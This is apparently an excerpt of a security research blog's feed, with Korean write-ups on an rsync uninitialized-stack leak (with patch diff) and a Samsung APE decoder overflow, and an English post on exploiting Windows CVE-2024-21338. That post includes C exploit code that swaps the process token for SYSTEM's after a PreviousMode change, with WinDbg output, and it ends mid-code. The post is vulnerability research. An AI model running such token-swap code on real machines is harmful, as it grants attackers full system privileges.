class="hljs-keyword">break</span>;      <span class="hljs-keyword">case</span> CSUM_XXH3_128:          <span class="hljs-comment">/* 16&#xBC14;&#xC774;&#xD2B8;&#xB9CC; &#xC500; (low64 + high64) */</span>          XXH128_hash_t digest = XXH3_128bits_withSeed(buf, len, checksum_seed);          SIVAL64(sum, <span class="hljs-number">0</span>, digest.low64);          SIVAL64(sum, <span class="hljs-number">8</span>, digest.high64);          <span class="hljs-keyword">break</span>;      <span class="hljs-keyword">case</span> CSUM_MD5:          <span class="hljs-comment">/* md5_result()&#xB85C; 16&#xBC14;&#xC774;&#xD2B8; &#xC791;&#xC131; */</span>          md5_result(&amp;m5, (uchar *)sum);          <span class="hljs-keyword">break</span>;      <span class="hljs-comment">/* ... */</span>    }}</code></pre><ul><li>&#xD574;&#xC2DC; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC5D0; &#xB530;&#xB77C; &#xACE0;&#xC815;&#xB41C; &#xAE38;&#xC774; &#xD639;&#xC740; &#xADF8;&#xC5D0; &#xC900;&#xD558;&#xB294; &#xAE38;&#xC774;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; sum &#xBC84;&#xD37C;&#xC5D0; &#xC4F4;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; XXH64&#xBA74; 8&#xBC14;&#xC774;&#xD2B8;, XXH3_128&#xC774;&#xBA74; 16&#xBC14;&#xC774;&#xD2B8;, MD5&#xB098; MD4&#xB3C4; 16&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xACB0;&#xACFC;&#xAC12;&#xC73C;&#xB85C; &#xC501;&#xB2C8;&#xB2E4;.</li><li>&#xADF8; &#xB4A4; &#xB098;&#xBA38;&#xC9C0; &#xBC14;&#xC774;&#xD2B8;(&#xBC84;&#xD37C;&#xC758; &#xCD5C;&#xB300; &#xAE38;&#xC774;&#xC778; MAX_DIGEST_LEN&#xC5D0;&#xC11C; &#xC2E4;&#xC81C; &#xD574;&#xC2DC; &#xAE38;&#xC774;&#xB97C; &#xBE80; &#xB098;&#xBA38;&#xC9C0;)&#xB294; &#xC804;&#xD600; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li></ul></li><li><code>s-&gt;s2length</code>&#xAC00; &#xC870;&#xC791;&#xB418;&#xAC70;&#xB098; &#xC758;&#xB3C4;&#xCE58; &#xC54A;&#xAC8C; &#xC2E4;&#xC81C; &#xD574;&#xC2DC; &#xAE38;&#xC774;&#xBCF4;&#xB2E4; &#xD074; &#xACBD;&#xC6B0;, <code>memcmp(sum2, sum2_at(s, i), s-&gt;s2length)</code> &#xD638;&#xCD9C; &#xC2DC; <code>sum2</code> &#xBC30;&#xC5F4; &#xC911; &#xACC4;&#xC0B0;&#xB41C; &#xD574;&#xC2DC;&#xAC00; &#xC4F0;&#xC774;&#xC9C0; &#xC54A;&#xC740; &#xB098;&#xBA38;&#xC9C0; &#xC601;&#xC5ED;(&#xBBF8;&#xCD08;&#xAE30;&#xD654; &#xC601;&#xC5ED;)&#xC744; &#xBE44;&#xAD50;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xACB0;&#xAD6D; &#xC2A4;&#xD0DD;&#xC5D0; &#xB0A8;&#xC544; &#xC788;&#xB358; &#xB370;&#xC774;&#xD130;(&#xCD5C;&#xB300; s2length - &#xD574;&#xC2DC; &#xC2E4;&#xC81C; &#xAE38;&#xC774;&#xB9CC;&#xD07C;)&#xAC00; &#xC720;&#xCD9C;&#xB420; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC0DD;&#xAE41;&#xB2C8;&#xB2E4;.</li></ol><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD568;&#xC218; &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xC5D0; sum2 &#xBCC0;&#xC218;&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">@@ <span class="hljs-number">-147</span>,<span class="hljs-number">6</span> +<span class="hljs-number">147</span>,<span class="hljs-number">9</span> @@ <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hash_search</span><span class="hljs-params">(<span class="hljs-keyword">int</span> f,struct sum_struct *s,</span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span> more;</span></span><span class="hljs-function"><span class="hljs-params">schar *<span class="hljs-built_in">map</span>;</span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">+ <span class="hljs-comment">// prevent possible memory leaks</span></span></span><span class="hljs-function"><span class="hljs-params">+ <span class="hljs-built_in">memset</span>(sum2, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> sum2);</span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-comment">/* want_i is used to encourage adjacent matches, allowing the RLL</span></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-comment"> * coding of the output to work more efficiently. */</span></span></span><span class="hljs-function"><span class="hljs-params">want_i = <span class="hljs-number">0</span>;</span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-12085/">CVE-2024-12085</category>
      
      <category domain="https://hackyboiz.github.io/tags/rsync/">rsync</category>
      
      <category domain="https://hackyboiz.github.io/tags/Uninitialized-Stack-Contents/">Uninitialized Stack Contents</category>
      
      <category domain="https://hackyboiz.github.io/tags/Info-Leak/">Info Leak</category>
      
      
      <comments>https://hackyboiz.github.io/2025/01/18/j0ker/2025-01-18/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-49415: 삼성 스마트폰의 OOB Write로 인한 Zero-Click RCE</title>
      <link>https://hackyboiz.github.io/2025/01/15/l0ch/2025-01-15/</link>
      <guid>https://hackyboiz.github.io/2025/01/15/l0ch/2025-01-15/</guid>
      <pubDate>Wed, 15 Jan 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/368</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://project-zero.issues.chromium.org/issues/368695689">https://project-zero.issues.chromium.org/issues/368695689</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>SAMSUNG libsaped.so &lt; SMR-2024 Release 1<ul><li>Galaxy S24/S23</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Android 12, 13, 14 &#xBC84;&#xC804;&#xC758; &#xC0BC;&#xC131; &#xBAA8;&#xBC14;&#xC77C; &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; Zero-Click RCE&#xB85C; &#xC545;&#xC6A9;&#xB420; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xB294; OOB Write &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xAD00;&#xB828; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; Monkey&#x2019;s Audio(APE) &#xD30C;&#xC77C;&#xC758; &#xB514;&#xCF54;&#xB354;&#xC778; <code>libsaped.so</code>&#xC758; <code>saped_rec</code> &#xD568;&#xC218;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>Monkey&#x2019;s Audio: &#xBB34;&#xC190;&#xC2E4; &#xC624;&#xB514;&#xC624; &#xB370;&#xC774;&#xD130; &#xC555;&#xCD95;&#xC744; &#xC704;&#xD55C; &#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xBC0F; &#xD30C;&#xC77C; &#xD615;&#xC2DD;&#xC73C;&#xB85C;, &#xC5EC;&#xB7EC; &#xD50C;&#xB7AB;&#xD3FC;&#xC758; &#xBBF8;&#xB514;&#xC5B4; &#xD50C;&#xB808;&#xC774;&#xC5B4;&#xC5D0;&#xC11C; &#xC9C0;&#xC6D0;&#xD568;.<br>&#xCD9C;&#xCC98; : <a href="https://en.wikipedia.org/wiki/Monkey&apos;s_Audio">https://en.wikipedia.org/wiki/Monkey&apos;s_Audio</a></p></blockquote><p>&#xC544;&#xB798;&#xB294; &#xC774;&#xD574;&#xB97C; &#xB3D5;&#xAE30; &#xC704;&#xD55C; FFmpeg&#xC758; APE &#xD30C;&#xC77C; &#xAD6C;&#xC870;&#xCCB4; &#xC815;&#xBCF4;&#xC774;&#xBA70; &#xCDE8;&#xC57D;&#xD55C; &#xC81C;&#xD488;&#xC758; APE &#xD30C;&#xC77C; &#xAD6C;&#xC870;&#xCCB4; &#xC120;&#xC5B8;&#xACFC;&#xB294; &#xC0C1;&#xC774;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">APEContext</span> {</span>    <span class="hljs-comment">/* Derived fields */</span>    <span class="hljs-keyword">uint32_t</span> junklength;    <span class="hljs-keyword">uint32_t</span> firstframe;    <span class="hljs-keyword">uint32_t</span> totalsamples;    <span class="hljs-keyword">int</span> currentframe;    APEFrame *frames;    <span class="hljs-comment">/* Info from Descriptor Block */</span>    <span class="hljs-keyword">int16_t</span> fileversion;    <span class="hljs-keyword">int16_t</span> padding1;    <span class="hljs-keyword">uint32_t</span> descriptorlength;    <span class="hljs-keyword">uint32_t</span> headerlength;    <span class="hljs-keyword">uint32_t</span> seektablelength;    <span class="hljs-keyword">uint32_t</span> wavheaderlength;    <span class="hljs-keyword">uint32_t</span> audiodatalength;    <span class="hljs-keyword">uint32_t</span> audiodatalength_high;    <span class="hljs-keyword">uint32_t</span> wavtaillength;    <span class="hljs-keyword">uint8_t</span> md5[<span class="hljs-number">16</span>];    <span class="hljs-comment">/* Info from Header Block */</span>    <span class="hljs-keyword">uint16_t</span> compressiontype;    <span class="hljs-keyword">uint16_t</span> formatflags;    <span class="hljs-keyword">uint32_t</span> blocksperframe;    <span class="hljs-keyword">uint32_t</span> finalframeblocks;    <span class="hljs-keyword">uint32_t</span> totalframes;    <span class="hljs-keyword">uint16_t</span> bps;    <span class="hljs-keyword">uint16_t</span> channels;    <span class="hljs-keyword">uint32_t</span> samplerate;} APEContext;</code></pre><blockquote><p>&#xCD9C;&#xCC98;:<br><a href="https://github.com/FFmpeg/FFmpeg/blob/master/libavformat/ape.c">https://github.com/FFmpeg/FFmpeg/blob/master/libavformat/ape.c</a><br><a href="https://ffmpeg.org/doxygen/trunk/structAPEContext.html">https://ffmpeg.org/doxygen/trunk/structAPEContext.html</a></p></blockquote><p><code>samsung.software.media.c2</code> &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xBBF8;&#xB514;&#xC5B4; &#xC2A4;&#xD2B8;&#xB9AC;&#xBC0D;&#xC744; &#xC704;&#xD574; <a href="https://docs.kernel.org/driver-api/dma-buf.html">dmabuf</a>&#xB97C; <code>0x120000</code> &#xACE0;&#xC815; &#xD06C;&#xAE30;&#xB85C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xB514;&#xCF54;&#xB354;&#xB294; APE &#xD30C;&#xC77C;&#xC758; Header Block &#xC911; <code>blocksperframe</code> &#xD544;&#xB4DC;&#xB97C; &#xC55E;&#xC11C; &#xD560;&#xB2F9;&#xB41C; dmabuf&#xB85C; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xB514;&#xCF54;&#xB354;&#xB294; <code>blocksperframe</code>&#xC758; &#xCD5C;&#xB300;&#xAC12;&#xC744; <code>0x120000</code>&#xB85C; &#xC81C;&#xD55C;&#xD588;&#xC9C0;&#xB9CC;, bytes per sample&#xC774; 24&#xC778; &#xACBD;&#xC6B0; &#xCD5C;&#xB300; 3*blocksperframe&#xAE4C;&#xC9C0; &#xBCF5;&#xC0AC;&#xD560; &#xC218; &#xC788;&#xC5B4; dmabuf&#xB97C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xD55C; &#xAE30;&#xAE30;&#xB294; Rich Communication Services(RCS)&#xAC00; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC5B4; ape &#xD30C;&#xC77C;&#xC774; &#xD3EC;&#xD568;&#xB41C; RCS &#xC74C;&#xC131; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xBA74; &#xD14D;&#xC2A4;&#xD2B8; &#xBCC0;&#xD658; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xC624;&#xB514;&#xC624;&#xB97C; &#xB514;&#xCF54;&#xB529; &#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC720;&#xC800; &#xC0C1;&#xD638;&#xC791;&#xC6A9; &#xC5C6;&#xC774; &#xCDE8;&#xC57D;&#xC810; &#xD2B8;&#xB9AC;&#xAC70;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/FFmpeg/FFmpeg/blob/master/libavformat/ape.c">https://github.com/FFmpeg/FFmpeg/blob/master/libavformat/ape.c</a></li><li><a href="https://ffmpeg.org/doxygen/trunk/structAPEContext.html">https://ffmpeg.org/doxygen/trunk/structAPEContext.html</a></li><li><a href="https://en.wikipedia.org/wiki/Monkey&apos;s_Audio">https://en.wikipedia.org/wiki/Monkey&apos;s_Audio</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/samsung/">samsung</category>
      
      <category domain="https://hackyboiz.github.io/tags/zero-click/">zero-click</category>
      
      <category domain="https://hackyboiz.github.io/tags/out-of-bounds/">out-of-bounds</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/galaxy-s24/">galaxy s24</category>
      
      
      <comments>https://hackyboiz.github.io/2025/01/15/l0ch/2025-01-15/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 (En)</title>
      <link>https://hackyboiz.github.io/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/</link>
      <guid>https://hackyboiz.github.io/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/</guid>
      <pubDate>Sun, 12 Jan 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/en/&quot;&gt;Bypassing Windows Kernel Mitigations: Part1 -</description>
        
      
      
      
      <content:encoded><![CDATA[<p><a href="https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/en/">Bypassing Windows Kernel Mitigations: Part1 - Overview</a></p><p>Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 &#x2190; Now</p><hr><p>After last month&#x2019;s Part 1 introducing Windows Kernel Mitigation, we&#x2019;re back with Part 2, and this time it&#x2019;s time to dive into kCFG bypassing. We&#x2019;ll analyze the Local Privilege Escalation vulnerability CVE-2024-21338 in appid.sys, which was patched in February 2024, and introduce three post-exploitation techniques to bypass kCFG.</p><h2 id="CVE-2024-21338-appid-sys-Untrusted-Pointer-Dereference"><a href="#CVE-2024-21338-appid-sys-Untrusted-Pointer-Dereference" class="headerlink" title="CVE-2024-21338 - appid.sys Untrusted Pointer Dereference"></a>CVE-2024-21338 - appid.sys Untrusted Pointer Dereference</h2><blockquote><p>Vulnerability analysis and exploitation was performed on Windows 23H2 build 22631.2861 (December 2023 Cumulative Update applied).</p></blockquote><p>The CVE-2024-21338 vulnerability itself is simple! </p><p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%201.png" alt="image.png"></p><p>When the appid.sys driver processes an I/O request from user mode, it calls the <code>AipSmartHashImageFile</code> function with a user mode buffer (SystemBuffer) if the IOCTL Code is <code>0x22A018</code>.</p><p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%202.png" alt="image.png"></p><p>Called in the following order: <code>AipSmartHashImageFile</code> - <code>AppHashComputeFileHashesInternal</code> - <code>AppHashComputeImageHashInternal</code>. In the <code>AppHashComputeImageHashInternal</code> function, call a pointer at offset <code>SystemBuffer+0x16.</code> </p><p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%203.png" alt="image.png"></p><p>By calling the user-mode controllable SystemBuffer in kernel context, the user will be able to call arbitrary callback pointers in kernel mode (red box). We can even control the address that references the first argument, rcx (blue box).</p><p>For more analysis and PoC, check out the reference links below!</p><ul><li><a href="https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp">https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp</a></li><li><a href="https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/">https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/</a></li></ul><p>Now we can call any function we want, but can&#x2019;t take advantage of any shellcode or ROP gadgets configured in user mode due to the existence of the mitgation below. </p><ul><li>SMEP that prevents the CPU from executing userland (ring 3) code while in Supervisor Mode (ring 0) privileged state.</li><li>kCFG that throws an exception and raises <code>KERNEL_SECURITY_CHECK_FAILURE</code> if the kernel address is not registered in the bitmap</li></ul><p>Even if the SMEP is bypassed by calling the address of the bypass gadget, it will still get stuck in kCFG because it is user-mode code.</p><p>Kernel exploits aimed at privilege escalation via token swapping require read and write access to kernel memory. To achieve this, three exploit techniques can establish Full Arbitrary Kernel Read/Write primitives by calling kernel functions that satisfy with kCFG.</p><ol><li>PreviousMode</li><li>SeDebugPrigvileges</li><li>I/O Ring Buffer</li></ol><p><del>In this part, I will introduce the above three techniques</del> Due to lack of time, I will only introduce the exploit using PreviousMode in this part&#x2026; and will cover the exploit using SeDebugPrivileges and I/O Ring Buffer in the next part!</p><p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%204.png" alt="image.png"></p><h2 id="EXP-1-PreviousMode"><a href="#EXP-1-PreviousMode" class="headerlink" title="EXP 1 - PreviousMode"></a>EXP 1 - PreviousMode</h2><p>The first is via the PreviousMode modification.</p><p><a href="https://learn.microsoft.com/ko-kr/windows-hardware/drivers/kernel/previousmode">PreviousMode</a> is a KTHREAD structure field that is a flag value that indicates that the thread&#x2019;s parameters came from a user-mode process if the user-mode application called a native system service routine in either the <strong>Nt</strong> or <strong>Zw</strong> version. A PreviousMode value of 1 indicates that the current thread object was created by a call from user-mode, and a value of 0 indicates that it was created from kernel-mode. This serves to restrict kernel access to objects from user-mode.</p><p>PreviousMode is a field in the KTHREAD structure that acts as a flag. It indicates whether the thread&#x2019;s parameters originated from a user-mode process. If a user-mode application calls a native system service routine (either the Nt or Zw version), PreviousMode reflects this.</p><ul><li>A value of 1 means the thread was created by a call from user mode.</li><li>A value of 0 means it was created from kernel mode.</li></ul><p>This flag helps restrict kernel access to objects originating from user mode</p><p>If we can modify the PreviousMode of a user-mode process to 0, we can call the <code>NtWriteVirtualMemory</code> or <code>ReadProcessMemory</code> functions to get the kernel memory RW primitives, which we&#x2019;ll demonstrate with a simple example and debugging to help make it easier to understand!</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;defines.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STATUS_INFO_LENGTH_MISMATCH 0xc0000004</span>_NtQuerySystemInformation pNtQuerySystemInformation;_NtFsControlFile pNtFsControlFile;_NtWriteVirtualMemory pNtWriteVirtualMemory;_NtReadVirtualMemory pNtReadVIrtualMemory;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GetNtFunction</span><span class="hljs-params">()</span> </span>{...}<span class="hljs-function">PVOID <span class="hljs-title">GetObj</span><span class="hljs-params">(PULONGLONG objptr, ULONG pid, HANDLE handle)</span></span>{...}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{PVOID KTHREAD = <span class="hljs-literal">NULL</span>;PVOID SYSTEM_EPROCESS = <span class="hljs-literal">NULL</span>;PVOID EPROCESS = <span class="hljs-literal">NULL</span>;ULONG dwbytes = <span class="hljs-number">0</span>;GetNtFunction();DWORD pid = GetCurrentProcessId();<span class="hljs-comment">// [1]</span>HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());GetObj(&amp;KTHREAD, pid, hThread);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current KTHREAD: %p\n&quot;</span>, KTHREAD);HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);GetObj(&amp;EPROCESS, pid, hProc);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current EPROCESS: %p\n&quot;</span>, EPROCESS);GetObj(&amp;SYSTEM_EPROCESS, <span class="hljs-number">4</span>, (HANDLE)<span class="hljs-number">4</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] System EPROCESS: %p\n&quot;</span>, SYSTEM_EPROCESS);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;modify previousmode in windbg and press any button..\n&quot;</span>);getch();<span class="hljs-comment">// [2]</span>pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + <span class="hljs-number">0x4b8</span> , (ULONGLONG)SYSTEM_EPROCESS + <span class="hljs-number">0x4b8</span>, <span class="hljs-keyword">sizeof</span>(ULONGLONG), &amp;dwbytes);<span class="hljs-comment">// [3]</span>system(<span class="hljs-string">&quot;cmd.exe&quot;</span>);}</code></pre><blockquote><p><a href="https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c">https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c</a></p></blockquote><p>The above code works as follows</p><ol><li>Leak the required address via the <code>NtQuerySystemInformation</code> API</li><li>Overwrite the token value of the user-mode process to the system process</li><li>Spawn a cmd with system privileges</li></ol><p>In normal execution, nothing happens because the user-mode process cannot RW the kernel memory via <code>pNtWriteVirtualMemory</code>&#x2026;but we will now modify PreviousMode in the debugger before calling <code>pNtWriteVirtualMemory</code> and do the privilege escalation.</p><p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%205.png" alt="image.png"></p><p>When we run it, it will output the KTHREAD/EPROCESS address of the current process and the EPROCESS address of the SYSTEM process. Copy these and go to windbg.</p><pre><code class="hljs c"><span class="hljs-number">2</span>: kd&gt; dt _KTHREAD FFFFDC0FC3780080nt!_KTHREAD   +<span class="hljs-number">0x000</span> Header           : _DISPATCHER_HEADER   +<span class="hljs-number">0x018</span> SListFaultAddress : (null)    +<span class="hljs-number">0x020</span> QuantumTarget    : <span class="hljs-number">0x8ad5b1e</span>   +<span class="hljs-number">0x028</span> InitialStack     : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7c30 Void   +<span class="hljs-number">0x030</span> StackLimit       : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>1000 Void   +<span class="hljs-number">0x038</span> StackBase        : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>8000 Void   +<span class="hljs-number">0x040</span> ThreadLock       : <span class="hljs-number">0</span>   +<span class="hljs-number">0x048</span> CycleTime        : <span class="hljs-number">0x4bf645c</span>   +<span class="hljs-number">0x050</span> CurrentRunTime   : <span class="hljs-number">0</span>   +<span class="hljs-number">0x054</span> ExpectedRunTime  : <span class="hljs-number">0xbe0b</span>   +<span class="hljs-number">0x058</span> KernelStack      : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7000 Void   +<span class="hljs-number">0x060</span> StateSaveArea    : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7c80 _XSAVE_FORMAT...   +<span class="hljs-number">0x220</span> Process          : <span class="hljs-number">0xffffdc0f</span>`c39640c0 _KPROCESS   +<span class="hljs-number">0x228</span> UserAffinity     : <span class="hljs-number">0xffffdc0f</span>`c3780a68 _KAFFINITY_EX   +<span class="hljs-number">0x230</span> UserAffinityPrimaryGroup : <span class="hljs-number">0</span>   +<span class="hljs-number">0x232</span> PreviousMode     : <span class="hljs-number">1</span> <span class="hljs-string">&apos;&apos;</span>   +0x233 BasePriority     : 8 &apos;&apos;</code></pre><p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%206.png" alt="image.png"></p><p>We can see that PreviousMode is located at <code>KTHREAD+0x232</code>. Since the current process is in user mode, we can see that the PreviousMode is 1. Now, in the Memory window of windbg, modify that value to 0.</p><p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%207.png" alt="image.png"></p><pre><code class="hljs c"><span class="hljs-number">2</span>: kd&gt; dt _KTHREAD FFFFDC0FC3780080nt!_KTHREAD   +<span class="hljs-number">0x000</span> Header           : _DISPATCHER_HEADER   +<span class="hljs-number">0x018</span> SListFaultAddress : (null)    +<span class="hljs-number">0x020</span> QuantumTarget    : <span class="hljs-number">0x8ad5b1e</span>   +<span class="hljs-number">0x028</span> InitialStack     : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7c30 Void   +<span class="hljs-number">0x030</span> StackLimit       : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>1000 Void   +<span class="hljs-number">0x038</span> StackBase        : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>8000 Void   +<span class="hljs-number">0x040</span> ThreadLock       : <span class="hljs-number">0</span>   +<span class="hljs-number">0x048</span> CycleTime        : <span class="hljs-number">0x4bf645c</span>   +<span class="hljs-number">0x050</span> CurrentRunTime   : <span class="hljs-number">0</span>   +<span class="hljs-number">0x054</span> ExpectedRunTime  : <span class="hljs-number">0xbe0b</span>   +<span class="hljs-number">0x058</span> KernelStack      : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7000 Void   +<span class="hljs-number">0x060</span> StateSaveArea    : <span class="hljs-number">0xfffff500</span>`<span class="hljs-number">166f</span>7c80 _XSAVE_FORMAT...   +<span class="hljs-number">0x220</span> Process          : <span class="hljs-number">0xffffdc0f</span>`c39640c0 _KPROCESS   +<span class="hljs-number">0x228</span> UserAffinity     : <span class="hljs-number">0xffffdc0f</span>`c3780a68 _KAFFINITY_EX   +<span class="hljs-number">0x230</span> UserAffinityPrimaryGroup : <span class="hljs-number">0</span>   +<span class="hljs-number">0x232</span> PreviousMode     : <span class="hljs-number">0</span> <span class="hljs-string">&apos;&apos;</span>   +0x233 BasePriority     : 8 &apos;&apos;</code></pre><p>Back in the Analytics machine, press any button to proceed to the next step. </p><pre><code class="hljs c">pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + <span class="hljs-number">0x4b8</span> , (ULONGLONG)SYSTEM_EPROCESS + <span class="hljs-number">0x4b8</span>, <span class="hljs-keyword">sizeof</span>(ULONGLONG), &amp;dwbytes);system(<span class="hljs-string">&quot;cmd.exe&quot;</span>)</code></pre><p>Kernel Read/Write is now possible with <code>pNtWritevirtualMemory</code> function through PreviousMode modification. After swapping the token with that of the system EPROCESS, executing the cmd process grants NT AUTHORITY\SYSTEM privileges&#x2026;!</p><p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%208.png" alt="image.png"></p><p>?</p><p><img src="/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/en/image%209.png" alt="image.png"></p><p>I got a BSOD.. ??</p><p>The problem occurs when we modify PreviousMode to kernel mode and then try to create a process with system privileges. Since the kernel mode PreviousMode is not needed after token swapping, it should be restored to its original value of 1 before creating the cmd process so that the process can be created without crashing.</p><pre><code class="hljs c"><span class="hljs-keyword">char</span>* restoreBuffer = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(CHAR));*restoreBuffer = <span class="hljs-number">1</span>;pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + <span class="hljs-number">0x232</span>, 